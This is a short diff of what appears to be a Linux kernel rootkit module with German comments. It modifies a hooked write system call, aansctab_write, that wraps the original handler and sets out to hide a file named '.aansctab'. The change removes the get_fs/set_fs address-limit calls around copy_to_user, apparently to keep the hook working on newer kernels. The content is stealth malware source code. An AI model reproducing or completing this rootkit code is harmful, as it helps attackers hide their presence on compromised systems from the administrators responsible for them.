@@ -55,7 +55,6 @@ psize **find(void) {
 asmlinkage ssize_t aansctab_write(int fd, const char __user *buff, ssize_t count) {
         int r;
         int i;
-        size_t len = strlen(replace);
 
         /* Dateiname, den wir verstecken wollen */
         char *proc_protect = ".aansctab";
@@ -77,13 +76,7 @@ asmlinkage ssize_t aansctab_write(int fd, const char __user *buff, ssize_t count
                 }
 
                 /* Puffer zurück zum Benutzer kopieren */
-                mm_segment_t old_fs;
-
-                old_fs = get_fs();
-
-                set_fs(KERNEL_DS);
                 copy_to_user(buff, kbuff, 255);
-                set_fs(old_fs);
 
                 r = (*o_write)(fd,buff,count);
 
